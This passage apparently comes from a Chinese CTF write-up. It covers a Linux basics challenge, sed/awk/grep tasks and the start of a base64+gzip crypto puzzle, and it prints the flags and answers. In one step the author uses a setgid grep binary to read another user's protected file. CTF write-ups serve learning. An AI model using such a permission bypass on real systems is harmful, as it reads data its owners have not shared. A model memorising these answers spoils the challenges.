<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf@pod-2a9e39db8abecac116e2:~$ <span class="built_in">id</span> ctf</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) <span class="built_in">groups</span>=1000(ctf)</span><br></pre></td></tr></table></figure>
<p>接下来我来看看有没有下列工具 [x] 未找到 ps [x] 未找到 file [x] 未找到 libelf [!] 有 3 个文件未找到，请先通过apt安装他们</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install -y procps</span><br><span class="line"><span class="built_in">sudo</span> apt install -y file</span><br><span class="line"><span class="built_in">sudo</span> apt install -y elfutils libelf-dev</span><br></pre></td></tr></table></figure>
<p>用户Jackson的家目录下有一个signature文件，请你读取其中的内容告诉我</p>
<p>直接读取权限不够，需要用一些手段</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctf@pod-2a9e39db8abecac116e2:~$ find / -<span class="built_in">type</span> f -perm -2000 2&gt;/dev/null</span><br><span class="line">/usr/sbin/unix_chkpwd</span><br><span class="line">/usr/bin/grep</span><br><span class="line">/usr/bin/chage</span><br><span class="line">/usr/bin/expiry</span><br></pre></td></tr></table></figure>
<p>尝试发现</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ctf@pod-2a9e39db8abecac116e2:~$ <span class="built_in">ls</span> -la /usr/bin/grep</span><br><span class="line">-rwxr-sr-x 1 root Jackson 203152 Jan  4  2024 /usr/bin/grep</span><br><span class="line">ctf@pod-2a9e39db8abecac116e2:~$ <span class="built_in">ls</span> -la /usr/bin/grep | awk <span class="string">&#x27;&#123;print $4&#125;&#x27;</span></span><br><span class="line">Jackson</span><br></pre></td></tr></table></figure>
<p><code>/usr/bin/grep</code> 是setgid到Jackson组的！这意味着当我们运行grep时，它会以Jackson组的权限运行，而Jackson组有读取signature文件的权限。</p>
<p>于是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf@pod-2a9e39db8abecac116e2:~$ /usr/bin/grep . /home/Jackson/signature</span><br><span class="line">db9ef65a-7e7b-4db2-af77-739ae0407f53</span><br></pre></td></tr></table></figure>
<p>你知道git吗？lazygit是一个TUI前端，可以方便git操作，请你帮我取来0.54.2版本，并告诉我文件的路径</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用apt安装必要的工具</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y wget</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果wget安装失败，尝试curl</span></span><br><span class="line">sudo apt install -y curl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载lazygit 0.54.2</span></span><br><span class="line">wget https://github.com/jesseduffield/lazygit/releases/download/v0<span class="number">.54</span><span class="number">.2</span>/lazygit_0<span class="number">.54</span><span class="number">.2</span>_Linux_x86_64.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar -xzf lazygit_0<span class="number">.54</span><span class="number">.2</span>_Linux_x86_64.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件路径</span></span><br><span class="line">pwd</span><br><span class="line">ls -la</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ctf@pod-2a9e39db8abecac116e2:~$ <span class="built_in">ls</span> -la</span><br><span class="line">total 29192</span><br><span class="line">drwx------ 1 ctf  ctf      4096 Dec 19 02:11 .</span><br><span class="line">drwxr-xr-x 1 root root     4096 Aug 26 18:13 ..</span><br><span class="line">-rw-r--r-- 1 ctf  ctf        67 Aug 25 08:23 .bash_history</span><br><span class="line">-rw-r--r-- 1 ctf  ctf       220 Jul 30 19:28 .bash_logout</span><br><span class="line">-rw-r--r-- 1 ctf  ctf      3606 Dec 19 01:59 .bashrc</span><br><span class="line">-rw-r--r-- 1 ctf  ctf       807 Jul 30 19:28 .profile</span><br><span class="line">-rw-rw-r-- 1 ctf  ctf       165 Dec 19 02:11 .wget-hsts</span><br><span class="line">-rw-r--r-- 1 ctf  ctf      1071 Aug 11 16:22 LICENSE</span><br><span class="line">-rw-r--r-- 1 ctf  ctf     31910 Aug 11 16:22 README.md</span><br><span class="line">-rw-r--r-- 1 root root       64 Aug 25 08:23 hint</span><br><span class="line">-rwxr-xr-x 1 ctf  ctf  21901496 Aug 11 16:27 lazygit</span><br><span class="line">-rw-rw-r-- 1 ctf  ctf   7906869 Aug 11 16:28 lazygit_0.54.2_Linux_x86_64.tar.gz</span><br></pre></td></tr></table></figure>
<p>最后从lazygit中提取出编译的build id信息吧（GNU的）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y binutils</span><br><span class="line">/home/ctf/lazygit | grep -i build</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">拿到一台机器，首先要检查一下系统信息，这台机器的发行版完整名字是(PRETTY_NAME)？</span><br><span class="line">Debian GNU/Linux 13 (trixie)</span><br><span class="line">[-] 通过</span><br><span class="line">ctf用户的权限是多少(UID)？</span><br><span class="line">1000</span><br><span class="line">[-] 通过</span><br><span class="line">接下来我来看看有没有下列工具</span><br><span class="line">[+] 已找到 ps</span><br><span class="line">[+] 已找到 file</span><br><span class="line">[+] 已找到 libelf</span><br><span class="line">[-] 已找到所有文件</span><br><span class="line">用户Jackson的家目录下有一个signature文件，请你读取其中的内容告诉我</span><br><span class="line">db9ef65a-7e7b-4db2-af77-739ae0407f53</span><br><span class="line">[-] 通过</span><br><span class="line">你知道git吗？lazygit是一个TUI前端，可以方便git操作，请你帮我取来0.54.2版本，并告诉我文件的路径</span><br><span class="line">/home/ctf/lazygit</span><br><span class="line">[-] 通过</span><br><span class="line">最后从lazygit中提取出编译的build <span class="built_in">id</span>信息吧（GNU的）</span><br><span class="line">c2d913ebc9b342bfa601bb4296492a46706d0769</span><br><span class="line">[-] 通过</span><br><span class="line">恭喜你成功通过了所有测试！flag是：CBCTF&#123;wOw-U-r_LIiiNUx-M@ST3R&#125;</span><br></pre></td></tr></table></figure>
<p><strong>CBCTF{wOw-U-r_LIiiNUx-M@ST3R}</strong></p>
<ul>
<li>三剑客</li>
</ul>
<blockquote>
<p>Linux有三剑客，你知道怎么使用吗？</p>
<p>使用telnet连接端口哦</p>
</blockquote>
<p>第一关：TASK 1 请输入一条命令，将标准输入中的所有x字符删除，并在第10行后插入一行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -e <span class="string">&#x27;s/x//g&#x27;</span> -e <span class="string">&#x27;10a checkme&#x27;</span></span><br></pre></td></tr></table></figure>
<p>第二关：TASK 2 请输入一条命令，给标准输入中的每一行加一个行号，类似1 …</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;print NR, $0&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>第三关：TASK 3 请输入一条命令，从标准输入中取出所有形如13190011239这样的电话号码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -oE <span class="string">&quot;1[0-9]&#123;10&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>CBCTF{25a972b3-8493-498c-ae21-ceac3e70e77b}</strong></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><ul>
<li>Wilderness</li>
</ul>
<blockquote>
<p>Had I not seen the… I’d almost swear this text was Base64. But something feels off—it’s as if it’s been… compressed somehow ?</p>
<p>若不是看到了·-··-· 我差点就以为这段文本是 Base64 编码。但总觉得哪里不对劲 —— 仿佛它被·-··-·压缩过？</p>
</blockquote>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H4sIAAAAAAACE81bW24bRxC8yuYrP0FQfYwAuYRi0zZhmgJMGUZuH0kkd7oes6TsBAhixLQ0OzuP7urq6uYfT8vh8fHzaTnsP++Wp0/70/L852H5uns4HP5+/t3x43L89uWv3dfflofDl8fTy/jn/+2Pz4N3y/f94f3u63F3Oi2PH5b3D08Pvy9/7p5+PS2nT/vj7nmiw/7jp6fl8bjsn5aH4/vltNst+w/L993y7uG4fNg//+jh+Pfy7vBtd/plQb3+h+cPr3+fP7z8bMHrv88/oTF1/lCXDza4zXMZ/DJIxpx/8jpP3Zqwvb10nvHUurDrzL6w85i8DNAr+k5hE74sqc+DzXkuHwrThb0Oopfq4PNOz4ML6zIAPY3xLv5VtYu7jvFlvD4Vl1EIJw9a4XpN0VrqOljmmS4s7UJNVGysv11u2Z663/yC2bTtrHuX+wpXYLdMZ4j0eH4XStyqwpb95IG5U99yfDre6UFVqW2sTnTbc4dhu0F2LzB/p51Gaxm+PD3w/PjkV/cdnWEC0jIIUl4/9g9nz7uATDnIXPDnstR1zHlUXwaujoZmqwNkik71/PE8c9EN9scvSAu0FcLWjL4erF6wznwdjA4Fl72vY65bXmemfY3z0XnWNUPnqWF1hbZlrFaHBoN2YnW5uFJ85nmuby/CZ7THLzbfb4etZZwhGj5vzUNoMyxhRYlq+7qeanuXOEgNZFsNcr2LcQhsh+ve0Q6zyPjJxq62gZk9N+hud6F+UaB5xrvWMXXbd8bjq7GtIWC1jVI0pnn0UjZ8sGasKe29cPOcx3Vj9bjVDqdnWHKGFDjMdwTVe4RdDbLG3mVfHQFqdhftXeI74wy31qP3/p9hJvpOa+ZfAjIRV0si/hoCyA4L8d6DbYyfQOZp67nG5e4yvPdmCWV7n/ngwHD3nUZlhY/NznDFOiLbMA7Qj6U4NnXMFFz1fd1jz+mczZ7TORef8xttNWKmrhmQd/XHOWRH/5rZWEk0H/Z8XfMWhvfYZMxcyECLyz4PWqKx8gSm1tk22J4b8UhrRl5zZzLsej8YvyoQIeM2pd7NfAwz/0ocyc4ZdeddDPSrQI3GzDDbqP/RmjtmTmOK4bPHyoAt6ju3fNABVi4XTt400E/8FDF+wQ78bltlDP8X/aJgiseNe88coCK29JhyE3sbf/45LvHDWBdi3NjXD/DncD5Vs7uomvCNtuZ2yzl2Z55ZZIcST8u0OPNTzta7Pc/O0OcZaU7E1duY0Iy/7uWr9+TUQ5yZ42HPd5z7eex2OyzlP2rG/d5HYhjepWNmdzHH3pQXUASZ8Xm5r2E/W3jYVSOJKV2zGkaCGC8ATHPYmBOprRbe7Bcw9bsZgJ9zx5bZGXZ73shBWJdop3E7XlhONMlz60ZuXukGy7B3AzMtDvor6pb9gPOUe3Lqyd6Tf/neQ54SfDnGOA6jnsfBeQuSBitaE2YcCZN8xzh2xLENfii8hXQ2THBsO/9K8VTX/DaMck7C72p5yjSXyVxL852eU9/kxqgJz+z3xfWvrdi99S4k/PEcf86jClO+Yeinb9/gYwkPUy0gc+yN+2p0hdZ8N/bOeaafc1jPVGuKecE0Z7TY9PO6hPhp0CW67ue8Tuwn62NvwIStmKJcovCG9QS9dxN/RAFOe3duc5MfUt4007pNZ2sK5ybW5TH3xsqQmxdSJSJwpKDPN7/gnPriGKlqxkmfnFiXVbVunhRgqVuVxtxW5IKqT6Wc1iVT9LAOyvUIE1yWl3aC0gnNu9cx5KeKbNb50Cs+mkn1y9WEt1r9SwNHCUMbNr+KBhWaK0hvAbUKiBxh6nevrLmkrP0JfYPK8K0o0AwyOIjqJKmIzOccynnov7KjE03G4aJcBe0GoGDFRfaEtJdlgIUO05rApUMqQSqpALOU3phU0PaYVoKECbaVyYl5bnkpIeBG86aQCkEtQSUCt94VxzwV6siPOKYoi4ypK6GfdtfYgXPpmY2/AxpJQ1Ilh9Y96Qapuo1J7C63lhJ/FwQg4wccSaBqoZbPuvErOTFP4QIEqQewPplm4eU549BFrZY9pLyZ9JEYY5WlFYE/A9q6YCoEiDAE7+4pp1BZWoaoB5RbaRFHEkPuOpOOjuHLNQl/LDvnrg9AIizKiy8jba8WC/jtXXCD7qJYZkH5sSAJmyLYWl6Q2gX1cQOZXt0OfQWW0LXAWqlNFJ0fClDTUh0hQ9Wjt4hMYorXNAuaeljDlXFIyXzd5oPkzqxSwEoPgU8+q0YeZRop1bI7qB9ALVwkwaKkDxHwyeZZySGO5K0CTAa4L4WvgIiHInZzc1hl1rNjT9acyYieWeJE6BKcMHMo10KQ6QouoRRidQAV+yGFKKLMDksb0lzG1A7b3iBXzrXKXmENTsw8ySBrcu+eJZEwJdfdeK8pVDDBRPsTOm028yup0VOnHEyqosGYNJZ4SMq5lfN5eNuzdsrxNWHST6tdQ+jwbh1lKC0LBhFepfIUrewMS6Cgl3Wk05JIoKw5XaV1RLe+HVczJHNxLcVbbfveyykov51y87IakHEAzraAVN8RkTD5ly6ejreUVQZCPu8AnGALnEyG4ri6MHdwucLgLEXqsFY+s31VkBEqJJgizhiFIAYCzf4sh503U7mIAbVnSl1DSqUxrgIBjuIM9wAH9amSFocYFPQM4cXEIOVJPwAVHCX39K9dBF3CqgP+dQnPC1JWAhdj8+Oc2YkLE+3heUpyWO7itv5VaA0xqD1VOS8oy4WN5OSLk9SVtkwBGhTIAnyVNmZLc5cyYfQ1K5widtSbYGKqLAM1EXuUiCEIcijvgnyQCSdHokk7k1FHL5r4Fx9YUJL8vXO/SpcyS6URQ4CnZqVpqVBZIa4qVbkumjQ0C3+KY1IDigkLI7Z+La6cCAX9mb8ehS51wtUVU6QDLbQ6NfR83JCYrlD9veTLWfYVD0qcFWmbIm03WJYOwPICPUzXiIhLwMKNNl3D+1IqsndyT/2yWIXeXcCbhVRHev78D+8bZUgyOwAA</span><br></pre></td></tr></table></figure>
<p>base64+Gunzip</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">It looks like this is a really long number, almost lost in the wilderness of data. Let&#x27;s shine a light on it and see if we can find any clues! 01010100 01101000 01100101 00100000 01110100 01101001 01101101 01100101 00100000 01101000 01100001 01110011 00100000 01100011 01101111 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100001 01101011 01100101 00100000 01100001 00100000 01100011 01101000 01101111 01101001 01100011 01100101 00101110 00100000 01000011 01101000 01101111 01101111 01110011 01100101 00100000 01110111 01101001 01110011 01100101 01101100 01111001 00101100 00100000 01101111 01110010 00100000 01111001 01101111 01110101 00100000 01110010 01101001 01110011 01101011 00100000 01101100 01100101 01110100 01110100 01101001 01101110 01100111 00100000 01111001 01101111 01110101 01110010 00100000 01101000 01100101 01100001 01110010 01110100 00100000 01100010 01100101 01100011 01101111 01101101 01100101 00100000 01100001 00100000 01101110 01100101 01110111 01100101 01110010 00100000 01110111 01101001 01101100 01100100 01100101 01110010 01101110 01100101 01110011 01110011 00101100 00100000 01100001 01101110 01100100 00100000 01110100 01101000 01100101 00100000 01110100 01110010 01110101 01100101 00100000 01100110 01101100 01100001 01100111 00100000 01101101 01100001 01111001 00100000 01110010 01100101 01101101 01100001 01101001 01101110 00100000 01101000 01101001 01100100 01100100 01100101 01101110 00100000 01101001 01101110 00100000 01110100 01101000 01100101 00100000 01110011 01101000 01100001 01100100 01100101 00101110 00001010 00001010 01010110 01000111 01101000 01101100 01001001 01000111 01011010 01110011 01011001 01010111 01100011 01100111 01100001 01011000 01001101 01100111 01010111 01101011 01000110 01000100 01010110 01000101 01011010 00110111 01001101 01010110 00111001 01101010 01001101 01001000 01010110 01110011 01011010 01000110 00111001 01101111 01010001 01001000 01011001 01111010 01011000 00110010 01001001 01110111 01100011 01101101 00110101 01101100 01011000 00110011 01010010 01101111 01001101 00110001 00111001 01010100 01100001 01000101 01000010 01101011 01001101 00110001 00111000 01110111 01011010 01101100 00111001 01110100 01010001 01000100 01100100 01101111 01100110 01010100 01010101 00110100 01001001 01010011 01000010 01001011 01100100 01011000 01001110 00110000 01001001 01000111 01000101 01100111 01100010 01000111 01101100 00110000 01100100 01000111 01111000 01101100 01001001 01000111 01110000 01110110 01100001 00110010 01010101 01110011 01001001 01000101 00110001 00110011 01011001 01010111 01101000 01101000 01100001 01000111 01000101 01101000 01001001 01010011 01000010 01011010 01100010 00110011 01010101 01100111 01100010 01010111 01101100 01101110 01100001 01001000 01010001 01100111 01100010 01101101 00111001 00110000 01100001 01010111 01001110 01101100 01001001 01001000 01010010 01101111 01011001 01011000 01010001 01100111 01100100 01000111 01101000 01101100 01001001 01000111 01011010 01110011 01011001 01010111 01100011 01100111 01011001 00110010 00111001 01110100 01011010 01011000 01001101 01100111 01011010 01101110 01001010 01110110 01100010 01010011 01000010 01101000 01001001 01001000 01000010 01110110 01011010 01010111 00110000 01100111 01011001 01101110 01101011 01100111 01010010 01000111 01101100 01101010 01100001 00110010 01101100 01110101 01100011 00110010 00111001 01110101 01001100 01000011 01000001 01101001 01010011 01000111 01000110 01101011 01001001 01000101 01101011 01100111 01100010 01101101 00111001 00110000 01001001 01001000 01001110 01101100 01011010 01010111 00110100 01100111 01100100 01000111 01101000 01101100 01001001 01001000 01001110 00110001 01100010 01101001 00110100 01101001 01001001 01000110 01010010 01101111 01011010 01010011 01000010 01110101 01011010 01011000 01101000 00110000 01001001 01000111 01111000 01110000 01100010 01101101 01010110 01111010 01001001 01000111 01100100 01110110 01001111 01101001 01000001 01101001 01010001 01101110 01010110 00110000 01001001 01000101 01111000 01110000 01011010 00110010 01101000 00110000 01001001 01000111 01000101 01100111 01100010 01101101 01010110 00110011 01011010 01011000 01001001 01100111 01010110 00110010 01101100 01110011 01011010 01000111 01010110 01111001 01100010 01101101 01010110 01111010 01100011 01111001 01110111 01100111 01010100 01011000 01101011 01100111 01010110 00110010 01101100 01110011 01011010 01000111 01010110 01111001 01100010 01101101 01010110 01111010 01100011 01111001 01000010 01101111 01011001 01011000 01001101 01100111 01100010 01010111 01000110 01101011 01011010 01010011 00110100 01101001 01001001 01000101 01101110 01101001 01100111 01001010 01101100 00110010 01011010 01010011 01000010 01110100 01011001 01010111 01010010 01101100 01001001 01000111 01000101 01100111 01100011 00110010 01111000 01110000 01011010 00110010 01101000 00110000 01001001 01000111 01000110 01110011 01100100 01000111 01010110 01111001 01011001 01011000 01010010 01110000 01100010 00110010 00110100 01100111 01100100 01000111 00111000 01100111 01100100 01000111 01101000 01101100 01001001 01000111 01111000 01110000 01100010 01101101 01010110 01111010 01001100 01000011 01000010 01110001 01100100 01011000 01001110 00110000 01001001 01001000 01010010 01110110 01001001 01000111 01001110 01110110 01100010 01101101 01011010 00110001 01100011 00110010 01010101 01100111 01100101 01010111 00111001 00110001 01100011 01101001 01000010 01101100 01100101 01010111 01010110 01111010 01001100 01101001 01000010 01010001 01011010 01011000 01001010 01101111 01011001 01011000 01000010 01111010 01001001 01001000 01010010 01101111 01100001 01011000 01001101 01100111 01100100 00110010 01101100 01110011 01100010 01000011 01000010 01101111 01011010 01010111 01111000 01110111 01001001 01001000 01101100 01110110 01100100 01010011 01000010 01101110 01100100 01010111 01010110 01111010 01100011 01111001 01000010 00110000 01100001 01000111 01010101 01100111 01100100 01001000 01001010 00110001 01011010 01010011 01000010 01101101 01100010 01000111 01000110 01101110 01010000 01111001 01000010 01000011 01100100 01011000 01010001 01100111 01100001 01010111 01011001 01100111 01100101 01010111 00111001 00110001 00110100 01101111 01000011 01011010 01100011 01101101 01010101 01100111 01100100 01011000 01000001 01100111 01011010 01101101 00111001 01111001 01001001 01000111 01000101 01100111 01011001 00110010 01101000 01101000 01100010 01000111 01111000 01101100 01100010 01101101 01100100 01101100 01001100 01000011 01000010 01110100 01011001 01011000 01101100 01101001 01011010 01010011 01000010 00110101 01100010 00110011 01010101 01100111 01100011 00110010 01101000 01110110 01100100 01010111 01111000 01101011 01001001 01000111 01111000 01110110 01100010 00110010 01110011 01100111 01011001 01101101 01000110 01101010 01100001 01111001 01000010 01101010 01011001 01011000 01001010 01101100 01011010 01101110 01010110 01110011 01100010 01001000 01101011 01100111 01011001 01010111 00110101 01101011 01001001 01001000 01001110 01101100 01011010 01010011 01000010 01110000 01011010 01101001 01000010 00110000 01100001 01000111 01010110 01111001 01011010 01010011 01100100 01111010 01001001 01000111 01000101 01100111 01100001 01000111 01101100 01101011 01011010 01000111 01010110 01110101 01001001 01000101 01001010 01101000 01100011 00110010 01010101 01100111 01011010 01000111 01010110 01101010 01100011 01101110 01101100 01110111 01100100 01000111 01101100 01110110 01100010 01101001 00110100 01100111 01010110 01000111 01101000 01101100 01100011 01101101 01011000 01101001 01100111 01001010 01101100 01111010 01001001 01000111 00110001 01110110 01100011 01101101 01010101 01100111 01100100 01000111 00111000 01100111 01011010 01000111 01101100 01111010 01011001 00110010 00111001 00110010 01011010 01011000 01001001 01100111 01100001 01010111 00110100 01100111 01100100 01000111 01101000 01101100 01001001 01000111 00110101 00110001 01100010 01010111 01001010 01101100 01100011 01101110 01001101 01100111 01011001 01010111 00110101 01101011 01001001 01000111 01111000 01101100 01100100 01001000 01010010 01101100 01100011 01101110 01001101 01110011 01001001 01001000 01001110 01101100 01011001 00110011 01001010 01101100 01100100 01001000 01001101 01100111 01100100 00110010 01000110 01110000 01100100 01000111 01101100 01110101 01011010 01111001 01000010 00110000 01100010 01111001 01000010 01101001 01011010 01010011 01000010 00110001 01100010 01101110 01011010 01101100 01100001 01010111 01111000 01101100 01011010 01000011 00110100 00111101 00001010 00001010 00110010 00110110 01000110 01101010 01110100 01101111 01111010 01110011 01011010 00110111 01010010 00110010 01000101 01010001 01000001 01110111 01010101 01010010 01000111 01011000 01110100 01110001 01011010 01000100 01101110 01100011 01100101 00110111 01011000 01010111 00110100 00110111 00110101 00110111 00110001 01101001 01100011 01010100 01010010 01010001 01001110 01011000 01110000 01101011 01010011 01010110 01101110 01110100 01001101 01101000 00111000 01000011 01101010 01101011 00110101 01110000 01110000 01001000 01000010 01010100 01100101 01001100 01000110 01100111 00110001 01001100 01010001 01101001 01010111 01110100 00111001 01011010 01010000 01110000 01010000 01110100 01101011 01010100 01110001 00111000 01100100 01110000 01110100 01001110 01111000 01100100 00110010 01011001 01010001 01100101 00110110 01011001 00110101 01100001 00110101 01101011 01010000 00111000 01110001 01010111 01010001 01100110 01001100 00111000 01000111 01010001 01001010 01010100 01101101 01101001 01110100 01010100 01000101 01111001 01101010 01100011 01110010 00110010 01100011 01000001 01110010 00110110 01001000 01010101 01111001 01001000 01010111 01110110 01111010 01000011 01101010 01100011 00111000 01100010 01001101 01100110 00111000 01100010 01111001 01100110 01101110 01010000 00110010 00110001 01101111 01100111 01010001 01111001 01010101 00110001 01010001 01000010 01110110 00110010 01001000 01000101 00110010 01010100 00111001 01010011 00110101 01101011 01110001 01100110 01011010 01101011 01101010 01101010 01001110 01000100 01001101 01100001 01011001 01000010 01010011 00110110 01010111 01001010 01010001 01100101 01000111 01100111 01000110 00110100 01110010 00111000 01010010 00110011 01011000 00110111 01100010 01001110 00110111 01100100 01001000 01100111 01011010 01001101 01000111 01000001 00110100 01100100 01101101 00110111 01100101 01010000 01110101 00111000 01110001 01100010 00110111 00111000 01001101 01000101 00111001 01101001 01000011 01100100 01110011 01100010 01110011 01101010 00111001 01100011 01110111 01100101 00110111 01101000 00110001 01001000 01011001 01000001 01011010 00110110 00110011 01001000 01111001 01001101 01110111 01111010 01010101 01100010 01110100 01000001 01010101 00111001 01100100 01100101 01010110 01010010 01111010 01000111 01110111 01101001 01110101 01010110 01000011 00111000 01011010 01110111 01000101 01101010 01101010 01100101 01110001 01010100 01101000 00111001 01000100 01101101 01000111 01110100 01010111 01110101 01101110 01101000 01001011 00111000 01110001 01010101 00110100 01101010 01000111 00110111 01101000 01100100 01011010 01001000 01100011 01010000 01110101 01000010 01110001 01001010 00110011 01110001 01101001 01000100 01000011 00111001 01100010 00110011 01110010 00110110 01101010 01111001 01101110 01001110 01001011 01101000 00110111 01000011 01111000 01001000 01100111 01010001 01011010 00110100 01001010 01010100 01100110 01011010 01010101 00110101 01000101 01101001 00110111 01110010 01011000 01101010 01001010 01110010 01010001 01101111 00111000 01100110 01001000 01010011 01010001 01100100 01000001 01101110 01010010 01001000 01110101 01110111 01000001 00111000 01010110 01100100 01011001 01001010 01101010 01011000 01000010 01010000 01100110 01101101 01110100 00110100 01100011 01010101 01111010 01010010 01110100 01010100 01110100 01001101 01001101 01100110 01001110 01100011 01010111 01110000 01110011 01010100 00110110 01101110 01010101 00110101 01111010 01110011 01101011 01011000 01101010 01010000 01010110 01110101 01000101 01010101 01101001 01000110 01110000 01010101 00110101 01001101 01111000 01000101 01000001 01010110 01101001 01111000 00110101 01001100 01000010 01110011 01100011 00110111 01011000 01110000 01010000 01010100 01101001 01110100 01010101 01001101 01100100 01110101 01100101 00110100 01011010 00110101 01010001 00110011 01010101 01100100 01010111 01011001 00110100 01001100 01010101 01100010 01110000 01000101 01001100 01100110 01111010 01100110 00111001 01001000 01000110 00110101 01000110 01110000 01010000 01110111 01100011 01000100 01100100 01000101 01010001 01110011 01001010 01110011 01101000 01111001 00110110 00111001 01010010 01110111 01110101 01010011 01010000 01111000 01111001 01001110 01111000 01000111 01011001 01100101 01110110 01110100 00110110 01101010 01110011 01111010 01100111 00110100 01110001 01010001 01000011 01010011 01000010 01011000 01100011 01010101 01000100 01001000 01110010 00110100 01101000 01101010 01100001 00110011 01011000 01010110 01111010 01000110 01001100 01100010 01000011 01110100 01110001 01101110 01011000 01111000 00111000 01110010 01110011 01001110 01101000 01101101 01000100 01100011 01110101 01101011 01011000 01001110 00110001 01110000 01101011 01000101 01000110 01000111 01010011 01010001 01111000 01110010 01010101 01000011 01100101 00110100 00110111 01010100 01100010 00110111 01010011 01101001 01011010 00110100 01001101 01001000 00111000 01100100 01101111 01001010 01010011 01000111 01001110 01000011 01011001 01100110 01110010 01110100 00110100 01001110 01110011 01101110 01110111 01100101 01100011 01100100 01100101 01010000 01110010 01001101 01110001 01100011 01100100 00110110 01010100 01111001 01010100 01001011 01110001 01110101 00110010 00110011 01010001 01010111 01001000 01101001 01010000 01110000 01010111 01100010 01110100 01110011 00110101 01001000 01010011 00111000 01100100 01101011 00110110 01100100 00110101 01111010 00110011 01100001 01001110 01111001 01001011 01100111 01111001 01100010 01110001 00110011 00110001 01010010 01101001 01111010 01011001 01111001 01001010 00110110 01000001 00110110 01101010 01000011 01100110 00110010 01000100 01101101 01001011 01010001 01111010 01001010 01000110 01110001 00110010 01111000 01101110 01010010 01100111 01100001 01101011 01000110 01110010 01100010 00110111 01101101 01110101 00110011 01100001 00110111 00111000 01001100 00110100 01110001 01100101 01110001 01101101 01110111 00111000 01010111 01001010 01100111 01110110 01010100 01100101 01111001 01101010 01101001 01001110 01100011 01100101 01000111 00110100 01001011 01101000 01001110 01101011 01110011 01101101 01100101 00110011 01010100 01010001 01110010 01000100 00110001 01011000 00110110 01110000 01101001 01010110 01101000 01010110 01110001 01110110 01010010 01001010 01000011 01000100 00110010 01110111 01110011 00110001 00111001 01111001 01000111 01001110 01001100 01000100 01010111 01001110 01110100 01010000 01010100 01110011 01101101 01111010 01001101 01010001 01010000 01010100 01100011 01110101 01001011 00111001 00110011 01000101 01010101 00110010 01000010 01110101 01110111 01100100 01110000 01111010 01100010 01001101 01000001</span><br></pre></td></tr></table></figure>
